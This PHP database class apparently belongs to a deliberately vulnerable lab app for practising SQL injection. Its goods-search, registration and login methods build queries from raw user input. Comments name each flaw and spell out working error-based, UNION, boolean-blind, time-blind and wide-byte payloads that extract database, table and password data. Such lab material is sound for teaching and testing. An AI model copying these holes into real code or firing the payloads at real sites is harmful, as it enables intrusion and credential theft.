<?php
class Db
{
    private $conn;

    public function __construct()
    {
        $config = parse_ini_file('cfg/db_config.ini');
        $host = $config['host'];
        $username = $config['username'];
        $password = $config['password'];
        $database = $config['database'];
        $port = $config['port'];
        $this->conn = new mysqli($host, $username, $password, $database, $port);
        if ($this->conn->connect_error) {
            die("Connection failed: " . $this->conn->connect_error);
        }
    }

    public function select($query)
    {
        $result = $this->conn->query($query);
        if (!$result) {
            trigger_error($this->conn->error, E_USER_ERROR);
            return;
        }
        return $result->fetch_all();
    }

    public function insert($query)
    {
        $result = $this->conn->query($query);
        if (!$result) {
            trigger_error($this->conn->error, E_USER_ERROR);
            return;
        }
        return $result;
    }

    public function update($query)
    {
        $result = $this->conn->query($query);
        if (!$result) {
            trigger_error($this->conn->error, E_USER_ERROR);
            return;
        }
        return $result;
    }

    public function delete($query)
    {
        $result = $this->conn->query($query);
        if (!$result) {
            trigger_error($this->conn->error, E_USER_ERROR);
            return;
        }
        return $result;
    }

    public function __destruct()
    {
        $this->conn->close();
    }

    /**
     * 搜索商品
     * VULN：常规回显注入，报错注入
     * Error-blind payload：1' union select 1,2,count(*),(concat(floor(rand(0)*2),(select database())))x from information_schema.columns group by x --+
     * 1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
     * 常规回显payload：
     * 探测表列数：'+order+by+5--+
     * 探测显示位：'+union+select+1,2,3,4--+
     * 爆数据库名：1'+union+select+111,2,3,(select database())--+
     * 爆表名：1'+union+select+111,2,3,(select group_concat(table_name) from information_schema.tables where table_schema='vuln')--+
     * 爆users表的列名：1'+union+select+111,2,3,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='vuln')--+
     * 爆users表的数据：1'+union+select+111,(select group_concat(id) from users),(select group_concat(password) from users),(select group_concat(name) from users)--+
     * @param mixed $name
     * @return array
     */
    public function searchGoodsByName($name)
    {
        return $this->select("SELECT * FROM goods WHERE name like '%$name%'");
    }

    private function searchUserByName($name)
    {
        return $this->select("SELECT * FROM users where name = '$name'");
    }
    /**
     * 用户注册
     * VULN：布尔盲注，延时注入
     * Boolean-blind payload：username=4&password='%2B(select 1 where 1=1))--+
     * 如果1=1成立，就能正常注册（密码为1），跳转到index.php
     * 否则密码就是NULL（''+NULL=NULL），数据库中的password字段有NOT NULL属性，就会发生错误
     * Time-blind payload：username=5&password='%2b(select if(1=2,sleep(0),sleep(3))))--+
     * 如果1=2成立，则立刻收到响应，密码是0（sleep函数返回0）
     * 否则延时3秒收到响应，密码还是0
     * @param mixed $name
     * @param mixed $password
     * @return mixed 成功：[id, name, password] 失败：void
     */
    public function registerUser($name, $password)
    {
        $name = str_replace("'", '', $name);
        if (empty($this->searchUserByName($name))) {
            $this->insert("INSERT INTO users (name, password) VALUES ('$name', '$password')");
            return array($this->conn->insert_id, $name, $password);
        } else {
            trigger_error("已存在名为 $name 的用户", E_USER_WARNING);
            return;
        }
    }
    /**
     * 用户登录
     * VULN：宽字节注入
     * 1%df' -> 1%df%5c%27（%5c是反斜杠\，%df%5c是汉字誠）-> 1誠'
     * @param string $name
     * @param string $password
     * @return mixed 成功：[id, name, password] 失败：void
     */
    public function userLogin($name, $password)
    {
        $this->conn->set_charset("gbk");
        $name = addslashes($name);
        $password = addslashes($password);
        $result = $this->select("SELECT * FROM users WHERE name = '$name' and password = '$password'");
        if (empty($result)) {
            trigger_error("登录失败，用户名或密码错误", E_USER_WARNING);
            return;
        } else {
            return $result[0];
        }
    }
}
?>
